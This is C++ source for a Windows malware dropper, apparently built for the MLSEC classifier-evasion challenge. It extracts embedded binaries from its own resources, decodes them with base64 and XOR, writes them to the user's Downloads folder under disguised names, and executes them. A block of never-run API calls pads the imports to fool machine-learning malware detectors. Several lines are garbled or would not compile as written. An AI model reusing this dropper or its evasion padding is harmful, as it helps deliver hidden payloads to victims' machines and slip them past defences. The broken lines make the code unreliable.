// Drops and executes an Executable Binary from the PE Resources
// Created By Marcus Botacin for the MLSEC challenge
// Changelog: Created in 2019, updated in 2020 with obfuscation tricks

// Required Imports
#define _CRT_SECURE_NO_WARNINGS

#ifndef DROPPER_XOR_KEY
#define DROPPER_XOR_KEY 0
#endif

#ifndef DROPPER_BASE64
#define DROPPER_BASE64 0
#endif

#ifndef DROPPER_OUTPUT
#define DROPPER_OUTPUT "\\FileSystem_exe_rebuild\\FileSystem_exe_rebuild.exe"
#endif

#include<cstdlib>
#include<cstdint>
#include<iostream>
#include<stdio.h>		// Debug Prints
#include<cstdint>
#include<windows.h>		// Resource Management
#include<shellapi.h>
#include"resource.h"	// Resources Definition
#include<time.h>		// rand seed
#include<map>
#include<string>
#include<cstring>
#include<algorithm>
#include<vector>
#include<filesystem>

// Imports for the dead code function
#include<commctrl.h>
#include<shlobj.h>>t.h>
#include<uxtheme.h>
// #include<atlstr.h>
// #include<atlenc.h>

// Linking with teh dead imports
#pragma comment(lib, "Comctl32.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "uxtheme.lib")
#pragma comment(lib, "mscoree.lib")

// Functions prototypes
void dead();
std::uint64_t check_version();
void dropper_start(int);
void drop(DWORD size, void* buffer, std::wstring);
void* XOR(void* data, DWORD size);
void* base64decode(void* data, DWORD* size);
bool non_exe_launch(std::wstring);
void exe_launch(std::wstring);
void set_name(std::uint64_t);
void setup_name(std::uint64_t);

// Dropper Configurations
#define DEAD_IMPORTS
// #define RANDOM_NAME
#define NAME_SIZE 10
//#define PAYLOAD_CMP_TEST
//#define DROPPER_EXTRACT_TEST
//#define W7_EXTRACT
//#define INJECT


// global: final binary name

typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
std::uint64_t os_version;
HMODULE h;

// 1 w11calc.exe (calculator for windows 11)
// 2 payload.exe (copies the version of calculator onto github)
// 3 payload.bat (copies calc.exe onto Downloads)
// 4 7calc.exe (calculator for windows 7)

std::wstring name1;
std::wstring name2;
std::wstring name3;
std::wstring name4;
std::wstring name5;

HRSRC r1;
HRSRC r2;
HRSRC r3;
HRSRC r4;
HRSRC r5;

HGLOBAL rc1;
HGLOBAL rc2;
HGLOBAL rc3;
HGLOBAL rc4;
HGLOBAL rc5;

void* data1;
void* data2;
void* data3;
void* data4;
void* data5;

DWORD size1;
DWORD size2;
DWORD size3;
DWORD size4;
DWORD size5;

// Entry Point
int main(int argc, char* argv[])
{

	LoadLibraryW(L"mscoree.dll");

	os_version = check_version();

	setup_name(os_version);

	set_name(os_version);

	// Handle to myself
	h = GetModuleHandle(NULL);
	if (os_version == 0){
		std::cout << "check_version failed. Cannot veriy OS version";
		return 0;
	}


/////////////////////////////////////////////////////

	 //Windows 7 extract version of Dropper

/////////////////////////////////////////////////////

	else if (os_version == 6) {
#ifdef W7_EXTRACT

		dropper_start(2);
		dropper_start(3);

	#if DROPPER_BASE64 == 1
		data2 = base64decode(data2, &size2);
		data3 = base64decode(data3, &size3);
	#endif

	#if DROPPER_XOR_KEY != 0
		data2 = XOR(data2, size2);
		data3 = XOR(data3, size3);
	#endif

		drop(size2, data2, name2);
		size3 = size3 - 1;
		drop(size3, data3, name3);

		bool result = non_exe_launch(name3);


		std::cout << "before launch";
		if (result == true){
			exe_launch(name2);
			std::cout << "after launch";
		} else {
			std::cout << "This failed and nothing happened.\n";
		}

////////////////////////////////////////////

//             Windows 7 regular version of dropper

////////////////////////////////////////////

#else
		dropper_start(1);
//		dropper_start(2);

	#if DROPPER_BASE64 == 1
		data1 = base64decode(data1, &size1);
//		data2 = base64decode(data2, &size2);
	#endif

	#if DROPPER_XOR_KEY != 0
		data1 = XOR(data1, size1);
//		data2 = XOR(data2, size2);
	#endif

		drop(size1, data1, name1);
//		drop(size2, data2, name2);

		exe_launch(name1);

#endif

#ifdef DEAD_CODE
		// dead code
		dead();
#endif
	// exit without waiting child process

	}

////////////////////////////////////////////////////////

	// Windows 10/11 handling of dropper

////////////////////////////////////////////////////////

	else if (os_version == 10) {

		dropper_start(4);
		dropper_start(5);
//		dropper_start(1);

	#ifdef DROPPER_BASE64 == 1
		data4 = base64decode(data4, &size4);
		data5 = base64decode(data5, &size5);
//		data1 = base64decode(data1, &size1);

	#endif

	#if DROPPER_XOR_KEY != 0
		data4 = XOR(data4, size4);
		data5 = XOR(data5, size5);
//		data1 = XOR(data1, size1);
	#endif

		drop(size4, data4, name4);
		drop(size5, data5, name5);
//		drop(size1, data1, name1);

		wprintf(L"[%ls]", name4.c_str());
		wprintf(L"[%ls]", name5.c_str());

//		exe_launch(name1);
		exe_launch(name4);

#ifdef DEAD_CODE
		// dead code
		dead();
#endif

	}

	else {
		std::cout << "OS that couldn't be handled.";
		return 0;
	}

	// exit without waiting child process
	return 0;
}

std::uint64_t check_version(){

	HMODULE hModule = GetModuleHandle("ntdll.dll");
	auto pRtlGetVersion = reinterpret_cast<RtlGetVersionPtr>(GetProcAddress(hModule, "RtlGetVersion"));
	if (pRtlGetVersion != 0) { // sucess
		RTL_OSVERSIONINFOW info = {};
		info.dwOSVersionInfoSize = sizeof(info);

		if (pRtlGetVersion(&info) == 0){
			return (std::uint64_t) info.dwMajorVersion;
		}
	}

	return 0;

}

// Gets the upper part of the file path for the respective name (name1, name2, etc.)
void setup_name(std::uint64_t os_version) {
	if (os_version == 0){
		return;
	}
	else if (os_version == 6){
#ifdef W7_EXTRACT

		const wchar_t* temp = _wgetenv(L"USERPROFILE");
		if (temp != nullptr){
			name2 += temp;
			name2 += L"\\Downloads";

			name3 += temp;
			name3 += L"\\Downloads";
		} else {
			printf("Problem with userprofile");
		}

#else

		const wchar_t* temp = _wgetenv(L"USERPROFILE");
		if (temp != nullptr){
			name1 += temp;
			name1 += L"\\Downloads";
			name2 += temp;
			name2 += L"\\Downloads\\en-US";
			CreateDirectoryW(name2.c_str(), NULL);

		} else {
			printf("Problem with userprofile");
		}

#endif
	}
	else if (os_version == 10){

		const wchar_t* temp = _wgetenv(L"USERPROFILE");
		if (temp != nullptr){
			name1 += temp;
			name1 += L"\\Downloads";

			name4 += temp;
			name4 += L"\\Downloads";
			name5 += temp;
			name5 += L"\\Downloads\\en-US";
			CreateDirectoryW(name5.c_str(), NULL);
		} else {
			printf("Problem with userprofile");
		}
	}
	else {
		std::cout << "Name wasn't given because of unknown OS\n";
	}
}

// Adds the lower end of the filepath to the respective name (name1, name2, etc.).
void set_name(std::uint64_t os_version)
{
	if (os_version == 0) {
		std::cout << "Could not set name due to invalid OS\n";
	}

	else if (os_version == 6) {

#ifdef W7_EXTRACT

	int valid = 0;
	#ifdef RANDOM_NAME
		valid = 0;
		srand(time(NULL));
		while (valid < NAME_SIZE)
		{
			char c = rand();
			if (c >= 'a' && c <= 'z')
			{
				name2.push_back(c);
			}
		}
		valid = 0;
		srand(time(NULL));
		while (valid < NAME_SIZE)
		{
			char c = rand();
			if (c >= 'a' && c <= 'z')
			{
				name3.push_back(c);
			}
		}
	#else

		name2+="\\file_get.exe";
		name3+="\\file_move.bat";

	#endif
#else

	const char* drop = DROPPER_OUTPUT;
	int size = MultiByteToWideChar(CP_UTF8, 0, drop, -1, nullptr, 0);
	std::wstring out(size-1, L'\0');
	MultiByteToWideChar(CP_UTF8, 0, drop, -1, out.data(), size);

	name1+=out;
	name2+=out;
	name2+=L"2";
	//name2+=L".mui";

#endif
	}

	else if (os_version == 10) {

#ifdef RANDOM_NAME
		int valid = 0;
		srand(time(NULL));
		while (valid < NAME_SIZE)
		{
			char c = rand();
			if (c >= 'a' && c <= 'z')
			{
				name1.push_back(c);
			}
		}
#else

		const char* drop = DROPPER_OUTPUT;
		int size = MultiByteToWideChar(CP_UTF8, 0, drop, -1, nullptr, 0);
		std::wstring out(size-1, L'\0');
		MultiByteToWideChar(CP_UTF8, 0, drop, -1, out.data(), size);

		// name1+=out.c_str();
		//name3+="\\file_move.bat";
		name4+=out;
		name5+=out;
		name5+=L".mui";

#endif
	}

	else {
		std::cout << "Cannot set name for unsupported OS\n";
	}

}

void dropper_start(int x){
	if (x == 1){
		// Locate Resource
		r1 = FindResource(h, MAKEINTRESOURCE(IDR_BIN1), MAKEINTRESOURCE(BIN));
		// Load Resource
		rc1 = LoadResource(h, r1);
		// Ensure nobody else will handle it
		data1 = LockResource(rc1);
		// Get embedded file size
		size1 = SizeofResource(h, r1);
	}
	if (x == 2){
		// Locate Resource
		r2 = FindResource(h, MAKEINTRESOURCE(IDR_BIN2), MAKEINTRESOURCE(BIN));
		// Load Resource
		rc2 = LoadResource(h, r2);
		// Ensure nobody else will handle it
		data2 = LockResource(rc2);
		// Get embedded file size
		size2 = SizeofResource(h, r2);
	}
	if (x == 3){
		r3 = FindResource(h, MAKEINTRESOURCE(IDR_BIN3), RT_RCDATA);
		rc3 = LoadResource(h, r3);
		// Ensure nobody else will handle it
		data3 = LockResource(rc3);
		// Get embedded file size
		size3 = SizeofResource(h, r3);
	}
	if (x == 4){
		//Locate Resource
		r4 = FindResource(h, MAKEINTRESOURCE(IDR_BIN4), MAKEINTRESOURCE(BIN));
		// Load Resource
		rc4 = LoadResource(h, r4);
		// Ensure nobody else will handle it
		data4 = LockResource(rc4);
		// Get embedded file size
		size4 = SizeofResource(h, r4);
	}
	if (x == 5){
		//Locate Resource
		r5 = FindResource(h, MAKEINTRESOURCE(IDR_BIN5), MAKEINTRESOURCE(BIN));
		// Load Resource
		rc5 = LoadResource(h, r5);
		// Ensure nobody else will handle it
		data5 = LockResource(rc5);
		// Get embedded file size
		size5 = SizeofResource(h, r5);
	}

}

bool non_exe_launch(std::wstring name){
	SHELLEXECUTEINFOW sei = {};
	sei.cbSize = sizeof(sei);
	sei.fMask = SEE_MASK_NOCLOSEPROCESS;
	sei.hwnd = NULL;
	sei.lpVerb = L"open";
	sei.lpFile = L"C:\\Users\\Administrator\\Downloads\\file_move.bat";
	sei.lpParameters = nullptr;
	sei.lpDirectory = NULL;
	sei.nShow = SW_SHOWNORMAL;

	STARTUPINFOW si = {};
	PROCESS_INFORMATION pi = {};
	si.cb = sizeof(si);

	BOOL result = CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", L"/c \"C:\\Users\\Administrator\\Downloads\\file_move.bat\"", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	if (result == true){
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		return true;
	} else {
		return false;
	}

//	BOOL result = ShellExecuteExW(&sei);
//	if ( result == TRUE ){
//	WaitForSingleObject(sei.hProcess, INFINITE);
//		CloseHandle(sei.hProcess);
//	}
//	else {
//		printf("this is error: %lu", GetLastError());
//	}
	std::cout << "This ran.\n";
}

// Launch a New Process based on the dropped file name
void exe_launch(std::wstring run_exe)
{
	STARTUPINFOW siw;
	PROCESS_INFORMATION piw;
	ZeroMemory(&siw, sizeof(siw));
	siw.cb = sizeof(siw);
	ZeroMemory(&piw, sizeof(piw));

	STARTUPINFOA sia;
	PROCESS_INFORMATION pia;
	ZeroMemory(&sia, sizeof(sia));
	sia.cb = sizeof(sia);
	ZeroMemory(&pia, sizeof(pia));
	// build injection command
#ifdef INJECT
	char cmd[10 * NAME_SIZE] = "C:\\Windows\\system32\\rundll32.exe";
	char args[100 * NAME_SIZE];
	sprintf_s(args, 999, "%s %s", cmd, run_exe);
	CreateProcessA(cmd, args, NULL, NULL, FALSE, 0, NULL, NULL, &sia, &pia);
	// call directly
#else
	std::wstring cmdW = L"C:\\Users\\Administrator\\Downloads\\exe_num28.exe";
	CreateProcessW( cmdW.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &siw, &piw);

	std::string cmdA = "C:\\Users\\Administrator\\Downloads\\exe_num28.exe";
	CreateProcessA( cmdA.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &sia, &pia);
	return true;
#endif
}

// Decode a Base64 String
// modified and  copied from geeks for geeks
void* base64decode(void* data, DWORD* size)
{
	static const int decode_table[256] = {
		-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
		-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
		-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
		52,53,54,55,56,57,58,59,60,61,-1,-1,-1, 0,-1,-1,
		-1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
		15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
		-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
		41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1
	};

	char* in = static_cast<char*>(data);
	size_t len = *size;

	std::vector<uint8_t> out;
	out.reserve(len * 3 / 4);

	int val = 0;
	int valb = -8;

	for (size_t i = 0; i < len; i++) {
		unsigned char c = in[i];
		if (decode_table[c] == -1) continue;
		val = (val << 6) + decode_table[c];
		valb += 6;
		if (valb >= 0) {
			out.push_back((val >> valb) & 0xFF);
			valb -= 8;
		}
	}

	// allocate + null terminator
	void* buffer = malloc(out.size() + 1);
	memcpy(buffer, out.data(), out.size());
	((char*)buffer)[out.size()] = '\0';
	char* contents = ((char*) &buffer);
	*size = (DWORD)out.size();
	return buffer;
}


// XOR bytes in the buffer with a key
void* XOR(void* data, DWORD size) {
	// auxiliary buffer
	// this is never freed, but ok, i'm not a goodware anyway
	void* buffer = malloc(size);
	unsigned char* test = (unsigned char*)malloc(size);
	for (int i = 0;i < size;i++)
	{
		((unsigned char*)buffer)[i] = ((unsigned char*)data)[i] ^ DROPPER_XOR_KEY;
		((unsigned char*)test)[i] = ((unsigned char*)buffer)[i];
	}
	free(test);
	return buffer;
}

// Drop buffer to file
void drop(DWORD size, void* buffer, std::wstring drop_name)
{

	FILE* f = _wfopen(drop_name.c_str(), L"wb");
	// traverse byte list
	if (!f) {
		perror("_wfopen");
	}
	else {
		for (int i = 0;i < size;i++)
		{

			// byte pointer
			unsigned char c1 = ((unsigned char*)buffer)[i];

			// drop byte to file
			fputc(c1, f);
		}

		// file fully written
		fclose(f);
	}

}

// Dead Imports Function
void dead()
{
	return;
	memcpy(NULL, NULL, NULL);
	memset(NULL, NULL, NULL);
	strcpy_s(NULL, NULL, NULL);
	ShellAboutW(NULL, NULL, NULL, NULL);
	SHGetSpecialFolderPathW(NULL, NULL, NULL, NULL);
	ShellMessageBox(NULL, NULL, NULL, NULL, NULL);
	RegEnumKeyExW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegOpenKeyExW(NULL, NULL, NULL, NULL, NULL);
	RegEnumValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegGetValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegDeleteKeyW(NULL, NULL);
	RegQueryInfoKeyW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	RegQueryValueExW(NULL, NULL, NULL, NULL, NULL, NULL);
	RegSetValueExW(NULL, NULL, NULL, NULL, NULL, NULL);
	RegCloseKey(NULL);
	RegCreateKey(NULL, NULL, NULL);
	BSTR_UserFree(NULL, NULL);
	BufferedPaintClear(NULL, NULL);
	CoInitialize(NULL);
	CoUninitialize();
	CLSID x;
	CoCreateInstance(x, NULL, NULL, x, NULL);
	IsThemeActive();
	ImageList_Add(NULL, NULL, NULL);
	ImageList_Create(NULL, NULL, NULL, NULL, NULL);
	ImageList_Destroy(NULL);
	WideCharToMultiByte(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	lstrlenA(NULL);
	GetStartupInfoW(NULL);
	DeleteCriticalSection(NULL);
	LeaveCriticalSection(NULL);
	EnterCriticalSection(NULL);
	GetSystemTime(NULL);
	CreateEventW(NULL, NULL, NULL, NULL);
	CreateThread(NULL, NULL, NULL, NULL, NULL, NULL);
	ResetEvent(NULL);
	SetEvent(NULL);
	CloseHandle(NULL);
	GlobalSize(NULL);
	GlobalLock(NULL);
	GlobalUnlock(NULL);
	GlobalAlloc(NULL, NULL);
	lstrcmpW(NULL, NULL);
	MulDiv(NULL, NULL, NULL);
	GlobalFindAtomW(NULL);
	GetLastError();
	lstrlenW(NULL);
	CompareStringW(NULL, NULL, NULL, NULL, NULL, NULL);
	HeapDestroy(NULL);
	HeapReAlloc(NULL, NULL, NULL, NULL);
	HeapSize(NULL, NULL, NULL);
	SetBkColor(NULL, NULL);
	SetBkMode(NULL, NULL);
	EmptyClipboard();
	CreateDIBSection(NULL, NULL, NULL, NULL, NULL, NULL);
	GetStockObject(NULL);
	CreatePatternBrush(NULL);
	DeleteDC(NULL);
	EqualRgn(NULL, NULL);
	CombineRgn(NULL, NULL, NULL, NULL);
	SetRectRgn(NULL, NULL, NULL, NULL, NULL);
	CreateRectRgnIndirect(NULL);
	GetRgnBox(NULL, NULL);
	CreateRectRgn(NULL, NULL, NULL, NULL);
	CreateCompatibleBitmap(NULL, NULL, NULL);
	LineTo(NULL, NULL, NULL);
	MoveToEx(NULL, NULL, NULL, NULL);
	ExtCreatePen(NULL, NULL, NULL, NULL, NULL);
	GetObjectW(NULL, NULL, NULL);
	GetTextExtentPoint32W(NULL, NULL, NULL, NULL);
	GetTextMetricsW(NULL, NULL);
	CreateSolidBrush(NULL);
	SetTextColor(NULL, NULL);
	GetDeviceCaps(NULL, NULL);
	CreateCompatibleDC(NULL);
	CreateFontIndirectW(NULL);
	SelectObject(NULL, NULL);
	GetTextExtentPointW(NULL, NULL, NULL, NULL);
	RpcStringFreeW(NULL);
	UuidToStringW(NULL, NULL);
	UuidCreate(NULL);
	timeGetTime();
	SetBkColor(NULL, NULL);
	free(NULL);
	isspace(NULL);
	tolower(NULL);
	abort();
	isalnum(NULL);
	isdigit(NULL);
	isxdigit(NULL);
	toupper(NULL);
	malloc(NULL);
	free(NULL);
	memmove(NULL, NULL, NULL);
	isalpha(NULL);
}
